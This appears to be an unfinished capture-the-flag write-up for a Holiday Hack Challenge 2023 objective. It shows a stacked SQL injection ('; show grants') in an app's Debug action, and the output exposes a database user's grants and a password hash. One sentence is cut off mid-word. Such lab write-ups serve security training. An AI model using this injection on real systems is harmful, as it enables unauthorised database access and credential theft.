# Objective 22: Missile Diversion
**Location: Space Island: Zenith SGS**

For this objective the same Docker image and Wireguard VPN connection as in [Objective 21](https://github.com/joergschwarzwaelder/hhc2023/tree/main/Objective-21).
The aim is to change the pointing mode from 0 ("Eatargeting system 

In the first step, the app "missile-targeting-system" is started just like the "camera" app in objective 21.

The "Action Service" of this app has the predefined action "Debug", which is vulnerable to SQL injections by supplying additional data like `; show grants` as "AttributeValue".
The output of these injections can be found on the "nanosat-mo-supervisor" tab, subtab "Apps Launcher service":
```
INFO: Debug action output: VERSION(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204 | 
Grants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | 
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | 
```




**Achievement: Ipsum**
<!--stackedit_data:
eyJoaXN0b3J5IjpbNjQ1MTAzLC00NjYyNDIzMjEsLTIwMTAxOT
I2M119
-->